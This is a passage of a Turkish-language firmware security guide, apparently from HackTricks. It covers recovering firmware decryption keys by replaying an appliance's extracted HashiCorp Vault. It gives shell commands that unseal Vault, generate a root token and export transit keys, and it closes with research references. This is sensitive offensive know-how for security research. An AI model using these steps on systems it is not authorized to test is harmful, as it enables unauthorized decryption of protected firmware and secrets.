- Header'ları, offset'leri ve line boundary'lerini `hexdump`, `xxd`, `strings -tx`, `base64 -d` ve `binwalk -E` ile dump edin.
- `Salted__` genellikle OpenSSL `enc` formatını ifade eder: sonraki 8 byte salt'tır ve kalan byte'lar ciphertext'tir.
- Tam olarak `256` byte'a decode olan bir Base64 field, RSA-2048 ciphertext'in random firmware password/session key'i wrap ettiğine dair güçlü bir ipucudur.
- Aynı file içindeki detached PGP material çoğu zaman yalnızca authenticity'yi korur; confidentiality mechanism olduğunu varsaymayın.

Static key hunting (`grep`, `strings`, PEM/PGP searches) başarısız olursa yalnızca private key aramak yerine **operational decrypt path'i** reverse edin:

- Updater / management binary'sini decompile edin ve encrypted blob'u kimin okuduğunu, hangi helper/API'nin bunu unwrap ettiğini ve istediği logical key name'i trace edin.
- Extract edilen root filesystem içinde KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) ile unit file'ları ve init script'lerini arayın.
- Plaintext `vault operator unseal ...`, recovery key'leri, bootstrap token'larını veya local KMS auto-unseal script'lerini private-key material ile eşdeğer kabul edin.

Appliance original Vault binary'sini ve storage backend'ini içeriyorsa, Vault internals'ı yeniden implement etmek yerine bu environment'ı replay etmek genellikle daha kolaydır:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Klonlanmış KMS üzerinde root ile:

- Transit anahtarlarını yalnızca izole klon içinde export edilebilir hale getirin: `vault write transit/keys/<name>/config exportable=true`
- Unwrap anahtarını export edin: `vault read transit/export/encryption-key/<name>`
- Kurtarılan RSA anahtarını, KMS tarafından kullanılan tam padding/hash çiftiyle deneyin. Başarısız bir PKCS#1 v1.5 decrypt ve başarısız bir varsayılan OAEP decrypt işlemi, anahtarın yanlış olduğunu kanıtlamaz; Vault-backed akışların çoğu SHA-256 ile OAEP kullanırken yaygın kütüphaneler varsayılan olarak SHA-1 kullanır.
- Payload `Salted__` ile başlıyorsa AES-CBC decrypt işleminden önce vendor'ın OpenSSL KDF'sini (`EVP_BytesToKey`, legacy appliance'larda genellikle MD5) tam olarak yeniden uygulayın.

Bu, "encrypted firmware" sorununu daha genel bir probleme dönüştürür: **appliance-side operational keys anahtarlarını kurtarın, ardından tam unwrap + KDF parametrelerini offline olarak yeniden uygulayın**.

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [Cracking Firmware with Claude: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
